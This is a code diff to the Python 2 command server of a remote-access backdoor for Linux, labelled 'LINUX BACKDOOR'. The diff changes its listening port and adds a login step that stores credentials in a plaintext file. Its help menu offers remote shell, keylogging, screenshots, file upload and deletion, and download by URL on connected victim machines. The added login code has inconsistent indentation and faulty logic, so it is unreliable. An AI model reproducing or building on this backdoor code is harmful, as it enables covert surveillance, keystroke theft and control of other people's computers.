@@ -29,7 +29,7 @@ clear = lambda: os.system('clear')
 c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-c.bind(('0.0.0.0', 413))
+c.bind(('0.0.0.0', 8888))
 c.listen(128)
 
 # client information
@@ -118,18 +118,59 @@ def upload(sock, local_filename, remote_filename=None):
 	time.sleep(interval)
 	Send(sock, "")
 	time.sleep(interval)
-#screenshot
+
+#Authorization
+os.system("apt-get install figlet")
+clear()
+os.system("figlet -t -k LINUX BACKDOOR")
+while True:
+        auth=True
+    	try:
+        	fptr = open("Details.txt","r")
+        	print "\nenter username"
+        	tmpusr=raw_input()
+        	print "\nenter password"
+        	tmppwd=raw_input()
+        	for line in fptr:
+                        print line.rstrip("\n")
+                        if line.rstrip("\n") == tmpusr:
+                            continue
+
+                        elif line.rstrip("\n") == tmppwd:
+                                continue
+                        else:
+                            auth= False
+                            print "wrong user name or password "
+                            break;
+                if auth is True:		
+		    print "login successful"
+                    break
+                else:
+                    continue
+
+		
+        except IOError:
+	        createptr=open("Details.txt","w")
+                print "\ncreate user name and password "
+                print "\nenter new username"
+                username=raw_input()
+                print "\nenter password"
+                password=raw_input()
+                print "\nenter your password again"
+                checkpasswd=raw_input()
+                if password==checkpasswd:
+                    createptr.write(username + "\n")
+                    createptr.write(password + "\n")
+                    print "\nuser created successfully"
+		    print "\n login to continue"
+
 
 
 	
 # refresh clients
 def refresh():
 	clear()
-        try:
-            os.system("figlet -t -k LINUX BACKDOOR")
-        except:
-            os.system("apt-get install figlet")
-            os.system("figlet -t -k LINUX BACKDOOR")
+	os.system("figlet -t -k LINUX BACKDOOR")
 	print '\nListening for clients...\n'
 	
 	if len(clients) > 0:
@@ -200,7 +241,7 @@ while True:
                     if data=="help":
                         print "\n Description:"
                         print "\n This is a simple back door tool for linux which  uses AES Encryption for secure transfer of data. This can be used as simple monitering tool. Creaters of this tool are not responsible if this tool is"
-                        print "misused. This tool supports multiple clients to connect. You can switch between the clients."
+                        print " misused. This tool supports multiple clients to connect. You can switch between the clients."
                         print "\nusage:                    			options"
                         print "\nlist of file names          		        ls"
                         print "\nknow working directory   			pwd"
@@ -209,10 +250,11 @@ while True:
                         print "\nupload a file            			upload filename.extension"
                         print "\ndelete a file            			delete filename.extension"
                         print "\ntake a screenshot        			screenshot"
-                        print "\nstart http server on port 5000     start http"
+                        print "\nstart http server on port 5000                  start http"
                         print "\nget key logs             			keylogger"
-                        print "\nto go back to list of clients                  quit     "
-                        print "\nterminate a client completely                  terminate\n\n"
+                        print "\nto go back to list of clients                   quit     "
+                        print "\nterminate a client completely                   terminate "
+                        print "\ndownload file through url  		    	downloadurl urllink \n\n"
 		    elif data=="shell":
 		        active = True
 		        Send(socks[activate], 'Activate')
